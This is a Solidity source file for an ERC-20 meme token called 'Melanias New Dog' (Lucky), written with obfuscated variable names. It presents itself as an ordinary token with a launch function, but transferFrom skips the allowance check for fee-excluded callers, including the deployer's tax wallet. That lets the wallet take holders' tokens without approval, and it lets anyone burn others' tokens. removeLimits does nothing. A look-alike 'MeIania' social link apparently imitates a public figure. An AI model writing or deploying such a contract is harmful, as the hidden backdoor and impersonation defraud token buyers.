// SPDX-License-Identifier: MIT

/*
    Melanias New Dog
    Lucky

    https://t.me/MelaniasNewDog
    https://truthsocial.com/users/MeIania/statuses/114161293680376779
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract Lucky is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcMAMAD;
    mapping(address => mapping(address => uint256)) private _allcvnkjnMAMAD;
    mapping(address => bool) private _feevblknlMAMAD;
    address payable private _taxclknlMAMAD;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Melanias New Dog";
    string private constant _symbol = unicode"Lucky";

    uint256 private _vkjbnkfjMAMAD = 10;
    uint256 private _maxovnboiMAMAD = 10;
    uint256 private _initvkjnbkjMAMAD = 20;
    uint256 private _finvjlkbnlkjMAMAD = 0;
    uint256 private _redclkjnkMAMAD = 2;
    uint256 private _prevlfknjoiMAMAD = 2;
    uint256 private _buylkvnlkMAMAD = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknMAMAD;
    bool private _inlknblMAMAD = false;
    bool private swapvlkMAMAD = false;
    uint256 private _sellcnjkMAMAD = 0;
    uint256 private _lastflkbnlMAMAD = 0;
    address constant _deadlknMAMAD = address(0xdead);

    uint256 public _vnbbvlkMAMAD = qq30fef / 100;
    uint256 public _oijboijoiMAMAD = 15 * 10**18;
    uint256 private _cvjkbnkjMAMAD = 10;

    modifier lockTheSwap() {
        _inlknblMAMAD = true;
        _;
        _inlknblMAMAD = false;
    }
    constructor() payable {
        _taxclknlMAMAD = payable(_msgSender());
        
        _balknvlkcMAMAD[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcMAMAD[address(this)] = (qq30fef * 98) / 100;
        _feevblknlMAMAD[address(this)] = true;
        _feevblknlMAMAD[_taxclknlMAMAD] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcMAMAD[account];
    }
    
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function _transfer_kjvnMAMAD(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblMAMAD(from, to, amount);
        _balknvlkcMAMAD[from] = _balknvlkcMAMAD[from].sub(amount);
        _balknvlkcMAMAD[to] = _balknvlkcMAMAD[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcMAMAD[address(this)] = _balknvlkcMAMAD[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknMAMAD) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojMAMAD(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlMAMAD[msg.sender]) return !_feevblknlMAMAD[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknMAMAD)) return false;
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnMAMAD[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnMAMAD(sender, recipient, amount);
        if (_downcklkojMAMAD(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnMAMAD[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnMAMAD(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnMAMAD[owner][spender];
    }

    function _calcTax_lvknblMAMAD(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblMAMAD) {
                taxAmount = amount
                    .mul((_buylkvnlkMAMAD > _redclkjnkMAMAD) ? _finvjlkbnlkjMAMAD : _initvkjnbkjMAMAD)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlMAMAD[to] &&
                to != _taxclknlMAMAD
            ) {
                _buylkvnlkMAMAD++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblMAMAD &&
                to == uniswapV2Pair &&
                from != _taxclknlMAMAD &&
                swapvlkMAMAD &&
                _buylkvnlkMAMAD > _prevlfknjoiMAMAD
            ) {
                if (block.number > _lastflkbnlMAMAD) {
                    _sellcnjkMAMAD = 0;
                }
                _sellcnjkMAMAD = _sellcnjkMAMAD + _getAmountOut_lvcbnkMAMAD(amount);
                require(_sellcnjkMAMAD <= _oijboijoiMAMAD, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkMAMAD)
                    _swapTokenslknlMAMAD(_vnbbvlkMAMAD > amount ? amount : _vnbbvlkMAMAD);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjMAMAD(address(this).balance);
                }
                _lastflkbnlMAMAD = block.number;
            }
        }
        return taxAmount;
    }
    function _sendETHTocvbnjMAMAD(uint256 amount) private {
        _taxclknlMAMAD.transfer(amount);
    }
    function _swapTokenslknlMAMAD(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function DODODO() external onlyOwner {
        require(!_tradingvlknMAMAD, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkMAMAD = true;
        _tradingvlknMAMAD = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnMAMAD() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkMAMAD(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblMAMAD(address payable newWallet) external {
        require(_feevblknlMAMAD[_msgSender()]);
        _taxclknlMAMAD = newWallet;
        _feevblknlMAMAD[_taxclknlMAMAD] = true;
    }
}